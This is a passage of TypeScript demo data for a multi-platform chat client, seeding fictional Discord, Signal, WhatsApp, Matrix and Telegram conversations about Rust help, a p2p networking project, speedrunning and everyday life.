  { key: 'shipit:9002', name: 'shipit', url: badge('!', '#ff8c61', '#e86a92') },
  { key: 'lgtm:9003', name: 'lgtm', url: badge('✓', '#2ecc71', '#0dbd8b') },
  { key: 'wat:9004', name: 'wat', url: badge('?', '#f2a541', '#f7d154') },
  { key: 'ferris:9005', name: 'ferris', url: badge('R', '#d9480f', '#f76707') },
  { key: 'borrowck:9006', name: 'borrowck', url: badge('&amp;', '#5c7cfa', '#364fc7') },
];

interface MsgOpts {
  reply?: number;
  react?: Record<string, P.IdentityFact[]>;
  /** Reactions as Discord reports them: totals, super reactions, custom emoji. */
  fancy?: P.ReactionFact[];
  edited?: boolean;
  kind?: P.MessageKind;
  att?: P.AttachmentFact[];
  thread?: string;
  /** A forward, as Discord marks one. */
  fwd?: P.ForwardFact;
}
type Msg = [minutesAgo: number, author: P.IdentityFact, body: string, opts?: MsgOpts];
interface DemoConv {
  acc: AccKey[];
  fact: P.ConversationFact;
  msgs: Msg[];
  unread?: number;
}
interface DemoSpace {
  acc: AccKey[];
  fact: P.SpaceFact;
}

const pos = (n: number) => String(n).padStart(4, '0');
const H = 60;
const DAY = 24 * H;

// Discord: Rust Programming Language (main), libdither (main + alt), Hollow Knight Speedrunning (alt)
const g = {
  rust: snow('g-rust'),
  dither: snow('g-dither'),
  hk: snow('g-hk'),
};
const cat = (k: string) => snow('cat-' + k);
const ch = (k: string) => snow('ch-' + k);

const SPACES: DemoSpace[] = [
  { acc: ['dmain'], fact: { nativeId: g.rust, kind: 'community', name: 'Rust Programming Language', topic: 'The unofficial community server for Rust' } },
  ...(
    [
      ['rust-info', 'Information', 0],
      ['rust-help', 'Help', 1],
      ['rust-chat', 'Discussion', 2],
      ['rust-voice', 'Voice', 3],
    ] as const
  ).map(([k, name, i]): DemoSpace => ({ acc: ['dmain'], fact: { nativeId: cat(k), kind: 'section', name, parents: [{ nativeId: g.rust, position: pos(i) }] } })),
  { acc: ['dmain', 'dalt'], fact: { nativeId: g.dither, kind: 'community', name: 'libdither', topic: 'Dither: a coordinate-routed p2p network' } },
  ...(
    [
      ['dither-general', 'General', 0],
      ['dither-dev', 'Development', 1],
      ['dither-voice', 'Voice', 2],
    ] as const
  ).map(([k, name, i]): DemoSpace => ({ acc: ['dmain', 'dalt'], fact: { nativeId: cat(k), kind: 'section', name, parents: [{ nativeId: g.dither, position: pos(i) }] } })),
  { acc: ['dalt'], fact: { nativeId: g.hk, kind: 'community', name: 'Hollow Knight Speedrunning' } },
  ...(
    [
      ['hk-community', 'Community', 0],
      ['hk-runs', 'Runs', 1],
    ] as const
  ).map(([k, name, i]): DemoSpace => ({ acc: ['dalt'], fact: { nativeId: cat(k), kind: 'section', name, parents: [{ nativeId: g.hk, position: pos(i) }] } })),
  // Matrix: NixOS (with a nested subspace) and Rust Community; "Nix + Rust" sits in both.
  { acc: ['mx'], fact: { nativeId: room('nixos', 'nixos.org'), kind: 'community', name: 'NixOS', topic: 'The NixOS community space' } },
  { acc: ['mx'], fact: { nativeId: room('nix-eco', 'nixos.org'), kind: 'community', name: 'Nix Ecosystems', parents: [{ nativeId: room('nixos', 'nixos.org'), position: pos(9) }] } },
  { acc: ['mx'], fact: { nativeId: room('rust-space', 'matrix.org'), kind: 'community', name: 'Rust Community', topic: 'Rust rooms on Matrix' } },
  // WhatsApp: a community is its parent group; its groups are channels in it.
  { acc: ['wa'], fact: { nativeId: wgroup('nbh'), kind: 'community', name: 'Maple Street', topic: 'Neighbours on Maple Street' } },
];

const dch = (acc: AccKey[], k: string, name: string, section: string, i: number, x: Partial<P.ConversationFact> = {}): P.ConversationFact & { _acc?: AccKey[] } => ({
  nativeId: ch(k),
  shape: 'channel',
  name,
  spaces: [{ nativeId: cat(section), position: pos(i) }],
  ...x,
});
const mroom = (k: string, server: string, name: string, spaces: [string, number][], x: Partial<P.ConversationFact> = {}): P.ConversationFact => ({
  nativeId: room(k, server),
  shape: 'channel',
  name,
  spaces: spaces.map(([s, i]) => ({ nativeId: s, position: pos(i) })),
  ...x,
});
const sdm = (peer: P.IdentityFact): P.ConversationFact => ({ nativeId: `dm:${S.self.nativeId}:${peer.nativeId}`, shape: 'direct', participants: [S.self.nativeId, peer.nativeId], encrypted: true });
const sgroup = (k: string, name: string, members: P.IdentityFact[]): P.ConversationFact => ({
  nativeId: `group:${h('sg' + k).toString('base64').slice(0, 43)}=`,
  shape: 'group',
  name,
  participants: [S.self.nativeId, ...members.map((m) => m.nativeId)],
  encrypted: true,
});

const T = {
  rustHelpAsync: snow('t-rust-async'),
  rustHelpWs: snow('t-rust-ws'),
  ditherBoot: snow('t-dither-boot'),
  nixHelpFlake: `${room('nixos-help', 'nixos.org')}|${event('nix-help-root')}`,
};

const CONVS: DemoConv[] = [
  // ---------------- Discord: DMs and group DMs
  {
    acc: ['dmain'],
    fact: { nativeId: snow('dm-alice'), shape: 'direct', participants: [D.zyan.nativeId, D.alice.nativeId] },
    msgs: [
      [2 * DAY + 90, D.alice, 'did you see the new Celeste mod drop? the one with the dither shader 👀'],
      [2 * DAY + 80, D.zyan, 'no?? link'],
      [2 * DAY + 79, D.alice, 'https://gamebanana.com/mods/celeste-dither'],
      [2 * DAY + 60, D.zyan, 'ok that is gorgeous', { react: { '💜': [D.alice] } }],
      [DAY + 200, D.alice, "also pls stop getting pinged by me on three apps, I'll use signal for real stuff 😅"],
    ],
  },
  {
    acc: ['dmain'],
    fact: { nativeId: snow('dm-ravi-main'), shape: 'direct', participants: [D.zyan.nativeId, D.ravi.nativeId] },
    msgs: [
      [3 * DAY + 30, D.ravi, 'raid saturday? we need a healer'],
      [3 * DAY + 20, D.zyan, 'my healer is on my alt'],
      [3 * DAY + 19, D.ravi, "ah right, I'll ping you there"],
    ],
  },
  {
    acc: ['dalt'],
    fact: { nativeId: snow('dm-ravi-alt'), shape: 'direct', participants: [D.zyn.nativeId, D.ravi.nativeId] },
    msgs: [
      [2 * DAY + 10, D.ravi, 'ok pinging the alt: raid saturday 8pm, you are healing'],
      [2 * DAY + 5, D.zyn, 'ok ok'],
      [62, D.ravi, "we're short one dps, can you bring a friend?"],
    ],
    unread: 1,
  },
  {
    acc: ['dalt'],
    fact: { nativeId: snow('dm-jordan'), shape: 'direct', participants: [D.zyn.nativeId, D.jordan.nativeId] },
    msgs: [
      [4 * DAY + 30, D.jordan, 'Jordan accepted your friend request.', { kind: 'system' }],
      [4 * DAY, D.jordan, 'watched your pantheon run, the radiance fight was clean'],
      [4 * DAY - 10, D.zyn, 'thanks!! still losing time in the pogo section'],
      [4 * DAY - 12, D.jordan, '', { kind: 'sticker', att: [DEMO_STICKERS.picture] }],
      [4 * DAY - 13, D.jordan, '', { kind: 'sticker', att: [DEMO_STICKERS.lottie] }],
      [6 * H, D.jordan, 'try the route in #routes, saves like 2s'],
    ],
    unread: 1,
  },
  {
    acc: ['dmain'],
    fact: { nativeId: snow('gdm-raid'), shape: 'group', name: 'weekend raid', participants: [D.zyan.nativeId, D.ravi.nativeId, D.theo.nativeId] },
    msgs: [
      [2 * DAY + 40, D.ravi, "ok who's in for saturday"],
      [2 * DAY + 38, D.theo, 'me'],
      [2 * DAY + 30, D.zyan, 'me (on the alt lol)'],
      [31, D.theo, 'can we push it to 9? dinner thing'],
    ],
    unread: 1,
  },

  // ---------------- Discord: Rust Programming Language
  { acc: ['dmain'], fact: dch(['dmain'], 'rust-rules', 'rules', 'rust-info', 0, { variant: 'rules' }), msgs: [[30 * DAY, D.ferris, 'Be kind. Read the [code of conduct](https://www.rust-lang.org/policies/code-of-conduct) before posting.']] },
  {
    acc: ['dmain'],
    fact: dch(['dmain'], 'rust-ann', 'announcements', 'rust-info', 1, { variant: 'announcement' }),
    msgs: [[5 * DAY, D.mara, '**New stable release is out!** Async closures in traits got a big ergonomics pass. Release notes: https://blog.rust-lang.org/', { react: { '🎉': [D.owl, D.tim, D.bea, D.hannah] } }]],
  },
  {
    acc: ['dmain'],
    fact: dch(['dmain'], 'rust-beginners', 'beginners', 'rust-help', 0, { topic: 'No question is too small' }),
    msgs: [
      [3 * H + 10, D.tim, 'why does `let x: Vec<u8> = vec![]; x.push(1);` fail?'],
      [3 * H + 8, D.hannah, '`x` is not `mut`. try `let mut x`', { reply: 0 }],
      [3 * H + 5, D.tim, 'oh. thank you 🙏'],
      [2 * H + 20, D.bea, 'anyone know a good resource for lifetimes that is not the book?'],
      [2 * H + 10, D.owl, '"Common Rust Lifetime Misconceptions" by pretzelhammer is the classic', { reply: 3 }],
      [H + 15, D.mara, 'also the rustonomicon chapter on subtyping'],
      [26, D.tim, 'is this the idiomatic way?\n```rust\nfn longest<\'a>(a: &\'a str, b: &\'a str) -> &\'a str {\n    if a.len() > b.len() { a } else { b }\n}\n```'],
      [21, D.hannah, "yep, that's straight from the book 👍", { reply: 6 }],
    ],
    unread: 5,
  },
  { acc: ['dmain'], fact: dch(['dmain'], 'rust-help', 'help', 'rust-help', 1, { variant: 'forum', topic: 'One post per question' }), msgs: [] },
  {
    acc: ['dmain'],
    fact: { nativeId: T.rustHelpAsync, shape: 'thread', name: 'Lifetime error with async closures', parentConversation: ch('rust-help') },
    msgs: [
      [7 * H, D.owl, 'I get `lifetime may not live long enough` when I capture `&self` in an async closure passed to `tokio::spawn`. Minimal repro: https://play.rust-lang.org/?gist=1a2b3c'],
      [6 * H, D.hannah, '`tokio::spawn` needs `\'static`. Clone what you need into the closure, or use `Arc<Self>`.'],
      [5 * H, D.owl, 'Arc worked, thanks!', { react: { '✅': [D.hannah] } }],
    ],
  },
  {
    acc: ['dmain'],
    fact: { nativeId: T.rustHelpWs, shape: 'thread', name: 'Workspace layout for a CLI + lib?', parentConversation: ch('rust-help') },
    msgs: [
      [DAY + 300, D.bea, 'How do people lay out a workspace with a library, a CLI, and some shared test fixtures?'],
      [DAY + 250, D.zyan, 'I do `crates/core`, `crates/cli`, and a virtual manifest at the root. Fixtures go in `crates/core/tests/fixtures`.'],
      [40, D.bea, `${at(D.zyan)} that's clean, do you share one target dir across them?`, { reply: 1 }],
    ],
    unread: 1,
  },
  {
    acc: ['dmain'],
    fact: dch(['dmain'], 'rust-offtopic', 'off-topic', 'rust-chat', 0),
    msgs: [
      [DAY + 100, D.owl, 'my ferris plushie arrived', {
          att: [img(ART.crab, 'ferris.png', 480, 360)],
          react: { '🦀': [D.tim, D.mara, D.bea] },
          fancy: [
            { key: DEMO_EMOJI[4].key, style: 'super', count: 6, authors: [D.tim.nativeId], colors: SUPER_COLORS, emoji: DEMO_EMOJI[4] },
            { key: '🎉', style: 'super', count: 2, authors: [D.mara.nativeId], colors: ['#ffd166', '#ef476f'] },
            { key: DEMO_EMOJI[0].key, count: 41, authors: [D.bea.nativeId], emoji: DEMO_EMOJI[0] },
            { key: '❤️', count: 128, authors: [] },
          ],
        }],
      [DAY + 95, D.tim, 'rewrite the plushie in rust'],
      [DAY + 90, D.mara, 'it is already memory safe, it has no pointers'],
      [3 * H, D.bea, 'hot take: `unwrap()` in examples is fine'],
      [2 * H + 50, D.hannah, 'hot take: hot takes in #off-topic are fine'],
    ],
    unread: 2,
  },
  {
    acc: ['dmain'],
    fact: dch(['dmain'], 'rust-showcase', 'showcase', 'rust-chat', 1),
    msgs: [
      [2 * DAY, D.owl, 'made a tiny TUI for ntfy notifications: https://github.com/example/ntfy-tui'],
      [DAY + 400, D.mara, 'this is great, starring it'],
    ],
  },
  { acc: ['dmain'], fact: dch(['dmain'], 'rust-voice-general', 'General', 'rust-voice', 0, { variant: 'voice' }), msgs: [] },

  // ---------------- Discord: libdither (both accounts are members)
  {
    acc: ['dmain', 'dalt'],
    fact: dch(['dmain', 'dalt'], 'dither-general', 'general', 'dither-general', 0),
    msgs: [
      [2 * DAY + 100, D.lev, 'welcome to the new folks from the HN thread 👋'],
      [2 * DAY + 95, D.quinn, 'pinned the getting-started doc'],
      [DAY + 500, D.pixelfox, 'pixelfox joined the server.', { kind: 'system' }],
      [DAY + 490, D.pixelfox, 'is dither like libp2p?'],
      [DAY + 470, D.zyan, 'similar goals, but routing is coordinate-based instead of a Kademlia DHT. see #routing-research', { reply: 3 }],
      [DAY + 460, D.pixelfox, 'oh neat, reading now', { react: { '👍': [D.zyan] } }],
    ],
  },
  {
    acc: ['dmain', 'dalt'],
    fact: dch(['dmain', 'dalt'], 'dither-ann', 'announcements', 'dither-general', 1, { variant: 'announcement' }),
    msgs: [[6 * DAY, D.quinn, '**dither-sim v0.4** is out: 10k-node simulations in the browser. https://github.com/libdither/dither-sim', { react: { '🚀': [D.lev, D.pixelfox, D.zyan] } }]],
  },
  {
    acc: ['dmain', 'dalt'],
    fact: dch(['dmain', 'dalt'], 'dither-dev', 'dev', 'dither-dev', 0, { topic: 'Development of libdither and friends' }),
    msgs: [
      [DAY + 120, D.lev, 'CI is red on main, the hashdb bump broke a doctest'],
      [DAY + 118, D.ci, '❌ `main` · build #482 failed · `hashdb`: doctest `insert_get`'],
      [DAY + 117, D.ci, 'full log', { att: [file('demo:build-482.txt', 'build-482.txt')] }],
      [DAY + 40, D.lev, 'fixed in #211'],
      [DAY + 39, D.lev, 'the fixed test, for anyone on the old branch', { att: [file('demo:insert_get.rs', 'insert_get.rs')] }],
      [DAY + 35, D.lev, '**dither-sim v0.4** is out: 10k-node simulations in the browser. https://github.com/libdither/dither-sim', { fwd: { conversation: ch('dither-ann'), message: `${ch('dither-ann')}~0`, space: g.dither } }],
      [DAY + 34, D.lev, 'release build, if you want to run it offline', { att: [file('demo:dither-sim-0.4.zip', 'dither-sim-0.4.zip')] }],
      [DAY + 30, D.ci, '✅ `main` · build #483 passed'],
      [DAY + 29, D.ci, 'benchmarks for #483', { att: [file('demo:bench-483.json', 'bench-483.json')] }],
      [3 * H, D.quinn, 'starting a thread for the bootstrap refactor', { thread: T.ditherBoot }],
      [58, D.quinn, `${at(D.zyan)} can you review the bootstrap PR before Friday? it touches the handshake`],
    ],
    unread: 2,
  },
  {
    acc: ['dmain', 'dalt'],
    fact: { nativeId: T.ditherBoot, shape: 'thread', name: 'DHT bootstrap refactor', parentConversation: ch('dither-dev') },
    msgs: [
      [3 * H - 1, D.quinn, "plan: drop the static seed list and bootstrap from any peer's coordinate table"],
      [2 * H + 30, D.lev, 'what about a cold start with zero peers?'],
      [2 * H + 10, D.quinn, 'fall back to DNS seeds, but only then', { reply: 1 }],
    ],
    unread: 3,
  },
  {
    acc: ['dmain', 'dalt'],
    fact: dch(['dmain', 'dalt'], 'dither-routing', 'routing-research', 'dither-dev', 1),
    msgs: [
      [4 * DAY, D.zyan, 'notes on greedy embedding into hyperbolic space: https://github.com/zyansheep/routing-research'],
      [4 * DAY - 5, D.zyan, 'the write-up so far', { att: [file('demo:routing-notes.md', 'routing-notes.md')] }],
      [4 * DAY - 8, D.zyan, 'and the raw numbers', { att: [file('demo:stretch.csv', 'stretch.csv')] }],
      [4 * DAY - 10, D.zyan, 'the three-node picture', { att: [file('demo:topology.svg', 'topology.svg')] }],
      [4 * DAY - 30, D.lev, 'the stretch numbers look great'],
      [DAY + 60, D.pixelfox, 'read the notes. how do you handle churn?'],
    ],
    unread: 1,
  },
  { acc: ['dmain', 'dalt'], fact: dch(['dmain', 'dalt'], 'dither-hangout', 'hangout', 'dither-voice', 0, { variant: 'voice' }), msgs: [] },

  // ---------------- Discord: Hollow Knight Speedrunning (alt only)
  {
    acc: ['dalt'],
    fact: dch(['dalt'], 'hk-general', 'general', 'hk-community', 0, { mute: { level: 'none' } }),
    msgs: [
      [5 * H, D.gorb, 'anyone doing pantheon races this weekend?'],
      [5 * H - 5, D.pat, 'maybe sunday'],
      [4 * H, D.shade, 'new patch broke the dash buffer again'],
      [4 * H - 2, D.gorb, 'nooo'],
      [3 * H, D.jordan, 'rolled back to 1.4.3.2, works fine'],
      [2 * H, D.pat, 'sunday 6pm UTC then?'],
    ],
    unread: 6,
  },
  {
    acc: ['dalt'],
    fact: dch(['dalt'], 'hk-routes', 'routes', 'hk-community', 1),
    msgs: [
      [DAY + 30, D.shade, 'new pogo route for white palace: skip the second saw', { att: [img(ART.route, 'route.png', 640, 360)] }],
      [6 * H, D.gorb, 'confirmed, saves about 2s'],
      [2 * H + 5, D.pat, `${at(D.zyn)} you were asking about this one, right?`, { reply: 0 }],
    ],
    unread: 2,
  },
  {
    acc: ['dalt'],
    fact: dch(['dalt'], 'hk-pb', 'pb-showcase', 'hk-runs', 0),
    msgs: [[2 * DAY, D.jordan, 'new PB! **42:17** any%', { react: { '🎉': [D.gorb, D.pat, D.zyn] } }]],
  },

  // ---------------- Signal
  {
    acc: ['sig'],
    fact: sdm(S.alice),
    msgs: [
      [26 * H, S.alice, 'are we still on for bouldering thursday?'],
      [26 * H - 4, S.self, 'yes! 7pm at Mesa?'],
      [25 * H, S.alice, "perfect. I'll bring the spare chalk bag"],
      [41, S.alice, "hey, can you grab my belay device from Theo's? I left it in his car"],
      [38, S.alice, 'no rush, just before thursday'],
    ],
    unread: 2,
  },
  {
    acc: ['sig'],
    fact: sdm(S.mom),
    msgs: [
      [3 * DAY, S.mom, 'Did you get the package?'],
      [3 * DAY - 30, S.self, 'yes! thank you ❤️'],
      [5 * H + 5, S.mom, 'Are you coming for dinner Sunday? Dad is making dumplings 🥟'],
      [5 * H, S.mom, "Bring a jacket, it's supposed to rain"],
    ],
    unread: 2,
  },
  {
    acc: ['sig'],
    fact: sdm(S.sam),
    msgs: [
      [DAY + 60, S.sam, 'lmk when the matrix bridge thing is ready, I want to try it'],
      [DAY + 50, S.self, 'soon™. doing a hub + PWA instead of bridges'],
      [DAY + 49, S.sam, 'ooh fancy'],
    ],
  },
  { acc: ['sig'], fact: sdm(S.theo), msgs: [[3 * H, S.theo, 'found a belay device in my car, yours?']], unread: 1 },
  {
    acc: ['sig'],
    fact: { nativeId: `dm:${S.self.nativeId}:${S.self.nativeId}`, shape: 'self', name: 'Note to Self', participants: [S.self.nativeId], encrypted: true },
    msgs: [
      [4 * DAY, S.self, 'idea: triage feedback button → few-shot examples for the local model'],
      [2 * DAY, S.self, 'ntfy topic for dither-chat: keep it tailnet-only'],
      [DAY, S.self, 'whiteboard from today', { att: [img(ART.whiteboard, 'whiteboard.png', 640, 400)] }],
    ],
  },
  {
    acc: ['sig'],
    fact: sgroup('climb', 'Climbing crew 🧗', [S.alice, S.sam, S.priya, S.theo]),
    msgs: [
      [2 * DAY + 30, S.priya, 'new set at Mesa is up! the purple V4 is evil'],
      [2 * DAY + 20, S.sam, 'I flashed it 😤', { react: { '🔥': [S.alice, S.theo] } }],
      [2 * DAY + 19, S.priya, 'liar', { reply: 1 }],
      [DAY + 80, S.theo, 'carpool thursday? I can fit 3'],
      [DAY + 70, S.alice, 'me + zyan'],
      [DAY + 60, S.self, '👍'],
      [50, S.priya, "anyone have a spare harness? mine's being retired"],
      [45, S.sam, 'I have one, three sizes too big though'],
      [20, S.priya, 'ok here is the purple V4, look at this heel hook', { att: [img(ART.wall, 'v4.jpg', 640, 420)] }],
    ],
    unread: 3,
  },
  {
    acc: ['sig'],
    fact: sgroup('family', 'Family', [S.mom, S.dad, S.mei]),
    msgs: [
      [DAY + 200, S.dad, 'photos from the garden', { att: [img(ART.garden, 'garden.jpg', 640, 420)] }],
      [DAY + 190, S.mei, 'the tomatoes!! 🍅'],
      [DAY + 185, S.mom, 'Your father is very proud of them', { react: { '😂': [S.mei, S.self] } }],
      [2 * H, S.mei, "who's bringing dessert sunday"],
    ],
    unread: 1,
  },
  {
    acc: ['sig'],
    fact: sgroup('dithercore', 'dither core', [S.quinn, S.lev]),
    msgs: [
      [3 * DAY, S.quinn, "keeping this group for anything we don't want in the public discord"],
      [DAY + 100, S.lev, 'a security report came in for the handshake code, forwarding it here'],
      [DAY + 90, S.self, 'on it tomorrow'],
      [4 * H, S.quinn, "reminder: we said we'd pick the transport crate this week. zyan, your call?"],
    ],
    unread: 1,
  },

  // ---------------- WhatsApp: DMs, a group, and a community with its announcements channel
  {
    acc: ['wa'],
    fact: { nativeId: W.nana.nativeId, shape: 'direct', participants: [W.self.nativeId, W.nana.nativeId], encrypted: true },
    msgs: [
      [2 * DAY, W.nana, 'Did you eat today? 🍲'],
      [2 * DAY - 30, W.self, 'yes nana, promise'],
      [3 * H, W.nana, 'Here is the recipe you asked for', { att: [img(ART.garden, 'recipe.jpg', 640, 420)] }],
      [3 * H - 1, W.nana, 'Call me on Sunday ❤️'],
    ],
    unread: 2,
  },
  {
    acc: ['wa'],
    fact: { nativeId: W.marco.nativeId, shape: 'direct', participants: [W.self.nativeId, W.marco.nativeId], encrypted: true },
    msgs: [
      [DAY + 40, W.marco, 'ciao! still up for the trip in march?'],
      [DAY + 35, W.self, '*yes*, booking the train this week'],
      [DAY + 30, W.marco, '🔥', { react: { '👍': [W.self] } }],
    ],
  },
  {
    acc: ['wa'],
    fact: { nativeId: W.alice.nativeId, shape: 'direct', participants: [W.self.nativeId, W.alice.nativeId], encrypted: true },
    msgs: [[6 * H, W.alice, 'sent you the bouldering video on whatsapp, signal kept compressing it']],
    unread: 1,
  },
  {
    acc: ['wa'],
    fact: { nativeId: wgroup('books'), shape: 'group', name: 'Book club 📚', participants: [W.self.nativeId, W.ines.nativeId, W.marco.nativeId, W.alice.nativeId], encrypted: true },
    msgs: [
      [3 * DAY, W.ines, 'next pick: The Dispossessed?'],
      [3 * DAY - 10, W.marco, 'yes!!', { react: { '❤️': [W.ines, W.alice] } }],
      [40, W.ines, 'reminder we meet thursday, chapters 1-5'],
    ],
    unread: 1,
  },
  {
    acc: ['wa'],
    fact: { nativeId: wgroup('nbh-ann'), shape: 'channel', variant: 'announcement', name: 'Maple Street neighbours', spaces: [{ nativeId: wgroup('nbh'), position: '0' }], encrypted: true },
    msgs: [[DAY + 300, W.hoa, 'Street party moved to Saturday the 14th because of the rain forecast.']],
  },
  {
    acc: ['wa'],
    fact: { nativeId: wgroup('nbh-swap'), shape: 'channel', name: 'Garden swap', spaces: [{ nativeId: wgroup('nbh'), position: '1' }], participants: [W.self.nativeId, W.hoa.nativeId, W.nana.nativeId], encrypted: true },
    msgs: [
      [DAY + 100, W.hoa, 'Anyone want rhubarb? I have way too much'],
      [DAY + 90, W.self, 'me! can pick up tomorrow'],
      [2 * H, W.hoa, 'Left it by the gate 🌿', { reply: 1 }],
    ],
    unread: 1,
  },

  // ---------------- Matrix
  {
    acc: ['mx'],
    fact: { nativeId: room('dm-alice', 'matrix.org'), shape: 'direct', participants: [M.self.nativeId, M.alice.nativeId], encrypted: true },
    msgs: [
      [3 * DAY + 100, M.alice, 'sending you the paper on CRDT-based chat sync I mentioned'],
      [3 * DAY + 99, M.alice, 'local-first-chat-sync.pdf', { kind: 'media', att: [{ kind: 'file', mime: 'application/pdf', name: 'local-first-chat-sync.pdf', size: DEMO_FILES['demo:local-first-chat-sync.pdf'].bytes.length, url: 'demo:local-first-chat-sync.pdf' }] }],
      [3 * DAY + 60, M.self, 'thanks! reading it tonight'],
    ],
  },
  {
    acc: ['mx'],
    fact: { nativeId: room('dm-kai', 'nixos.dev'), shape: 'direct', participants: [M.self.nativeId, M.kai.nativeId], encrypted: true },
    msgs: [
      [DAY + 30, M.kai, 'your nix-env repo — mind if I steal the zsh module?'],
      [DAY + 20, M.self, 'go for it'],
      [4 * H, M.kai, 'did you ever get nix-ld working with the playwright chromium?'],
    ],
    unread: 1,
  },
  {
    acc: ['mx'],
    fact: { nativeId: room('dm-sam', 'matrix.org'), shape: 'direct', participants: [M.self.nativeId, M.sam.nativeId], encrypted: true },
    msgs: [[6 * DAY, M.sam, 'room for the hackathon is up: #hackweek:matrix.org']],
  },
  {
    acc: ['mx'],
    fact: { nativeId: room('house', 'matrix.org'), shape: 'group', name: 'Housemates', participants: [M.self.nativeId, M.jules.nativeId, M.noor.nativeId, M.ben.nativeId], encrypted: true },
    msgs: [
      [2 * DAY, M.jules, 'rent split for november is in the sheet'],
      [2 * DAY - 1, M.jules, '', { kind: 'media', att: [file('demo:rent-split.xlsx', 'rent-split.xlsx')] }],
      [DAY + 300, M.noor, 'who left the oven on 😭'],
      [DAY + 290, M.ben, 'guilty', { react: { '😂': [M.noor, M.jules] } }],
      [DAY + 100, M.noor, '', { kind: 'encrypted' }],
      [3 * H, M.jules, 'internet guy is coming tomorrow 9-12, can someone be home?'],
    ],
    unread: 1,
  },
  {
    acc: ['mx'],
    fact: mroom('libdither-mx', 'matrix.org', 'libdither', [], { topic: 'Matrix home of the Dither project · also on Discord' }),
    msgs: [
      [2 * DAY + 40, M.mira, "is there a matrix bridge for the discord? I'd rather not join discord"],
      [2 * DAY + 20, M.self, 'working on something better than a bridge 👀'],
      [70, M.mira, 'ok now I have to ask, what is dither-chat? saw it in the commit log'],
    ],
    unread: 1,
  },
  {
    acc: ['mx'],
    fact: mroom('nixos-main', 'nixos.org', 'NixOS', [[room('nixos', 'nixos.org'), 0]], { topic: 'General NixOS discussion' }),
    msgs: [
      [6 * H, M.lina, '26.11 branch-off is next week, get your PRs in'],
      [5 * H, M.bort, 'is the systemd 260 bump going in?'],
      [5 * H - 10, M.lina, 'already merged to staging'],
      [3 * H, M.kai, 'unstable channel advanced 🎉'],
      [2 * H + 30, M.bort, 'finally'],
    ],
    unread: 3,
  },
  {
    acc: ['mx'],
    fact: mroom('nixos-help', 'nixos.org', 'NixOS Help', [[room('nixos', 'nixos.org'), 1]], { topic: 'Ask anything. Paste errors in full.' }),
    msgs: [
      [2 * H, M.bort, 'my flake.lock keeps changing in CI, any idea why?', { thread: T.nixHelpFlake }],
      [80, M.lina, 'answered in the thread'],
    ],
    unread: 1,
  },
  {
    acc: ['mx'],
    fact: { nativeId: T.nixHelpFlake, shape: 'thread', name: 'my flake.lock keeps changing in CI', parentConversation: room('nixos-help', 'nixos.org') },
    msgs: [
      [100, M.lina, 'is it the nixpkgs input? pin it with a rev'],
      [52, M.bort, 'that was it, thanks!'],
      [30, M.kai, 'also run `nix flake lock --no-update-lock-file` in CI so it fails loudly'],
    ],
    unread: 3,
  },
  {
    acc: ['mx'],
    fact: mroom('nix-dev', 'nixos.org', 'Nix Development', [[room('nixos', 'nixos.org'), 2]]),
    msgs: [[DAY, M.kai, 'lazy trees landed in nightly. eval of nixpkgs is ~3x faster here']],
    unread: 1,
  },
  {
    acc: ['mx'],
    fact: mroom('nixos-ann', 'nixos.org', 'NixOS Announcements', [[room('nixos', 'nixos.org'), 3]], { variant: 'announcement' }),
    msgs: [[5 * DAY, M.nixbot, 'NixOS 26.11 branch-off is scheduled for **2026-11-04**.']],
  },
  {
    acc: ['mx'],
    fact: mroom('nix-rust', 'nixos.org', 'Nix + Rust', [
      [room('nix-eco', 'nixos.org'), 0],
      [room('rust-space', 'matrix.org'), 2],
    ]),
    msgs: [
      [DAY + 60, M.ferrous, 'crane or naersk in 2026?'],
      [DAY + 55, M.kai, 'crane, no contest'],
      [DAY - 200, M.self, '+1 crane, I use it for libdither'],
      [2 * H, M.ferrous, `${at(M.self)} do you cache the deps derivation in CI?`, { reply: 2 }],
    ],
    unread: 1,
  },
  {
    acc: ['mx'],
    fact: mroom('nix-python', 'nixos.org', 'Nix + Python', [[room('nix-eco', 'nixos.org'), 1]]),
    msgs: [
      [3 * DAY, M.bort, 'uv2nix or poetry2nix?'],
      [3 * DAY - 20, M.lina, 'uv2nix these days'],
    ],
  },
  {
    acc: ['mx'],
    fact: mroom('rust-mx', 'matrix.org', 'Rust', [[room('rust-space', 'matrix.org'), 0]]),
    msgs: [
      [8 * H, M.mira, 'anyone going to RustConf next year?'],
      [7 * H, M.ferrous, 'if the talk gets accepted 🤞'],
      [5 * H, M.mira, 'good luck!'],
    ],
    unread: 2,
  },
  {
    acc: ['mx'],
    fact: mroom('rust-async-mx', 'matrix.org', 'Rust Async', [[room('rust-space', 'matrix.org'), 1]]),
    msgs: [
      [2 * DAY, M.ferrous, 'is there a consensus on structured concurrency crates yet?'],
      [2 * DAY - 40, M.mira, 'not really, but task scopes are getting close'],
    ],
  },
  // ---------------- Signal: a message request from someone not in your contacts (docs/add.md)
  {
    acc: ['sig'],
    fact: sdm(S.jamie),
    msgs: [[95, S.jamie, 'hi! got your number from the climbing gym list. are you still selling the 9.8 rope?']],
    unread: 1,
  },
  // ---------------- Telegram
  {
    acc: ['tg'],
    fact: { nativeId: `user:${TG.alice.nativeId}`, shape: 'direct', participants: [TG.self.nativeId, TG.alice.nativeId] },
    msgs: [
      [3 * DAY + 40, TG.alice, 'made a telegram finally. mostly for the film photo people'],
      [3 * DAY + 32, TG.self, 'welcome to the fourth app 😅'],
    ],
  },
  {
    acc: ['tg'],
    fact: { nativeId: `user:${TG.noor.nativeId}`, shape: 'direct', participants: [TG.self.nativeId, TG.noor.nativeId] },
    msgs: [
      [DAY + 70, TG.noor, 'the film swap group is t.me/+FilmSwap2026x if you want in'],
      [DAY + 64, TG.noor, 'and t.me/dithernews has the release notes now'],
    ],
    unread: 1,
  },
];

/**
 * Kit's eight pairs over three days: a cabin trip that starts on Discord, moves to Signal, a work PR on the work
 * account and Matrix, a message to the wrong one of your Discord accounts, a map sent on Matrix and asked about on
 * Discord. Minutes ago, newest last.
 */
const KIT_CONVS: DemoConv[] = [
  {
    acc: ['dmain'],
    fact: { nativeId: snow('dm-kit-main'), shape: 'direct', participants: [D.zyan.nativeId, KIT.exe.nativeId] },
    msgs: [
      [3 * DAY + 300, KIT.exe, 'you around the weekend after next? thinking cabin trip'],
      [3 * DAY + 290, D.zyan, 'maybe! who is going'],
      [3 * DAY + 288, KIT.exe, 'me, ravi, maybe theo. the one by the lake with the bad wifi'],
      [DAY + 100, KIT.exe, 'did you get my signal msg?'],
      [DAY + 95, D.zyan, 'yes, friday 4pm works'],
    ],
  },
  {
    acc: ['dmain'],
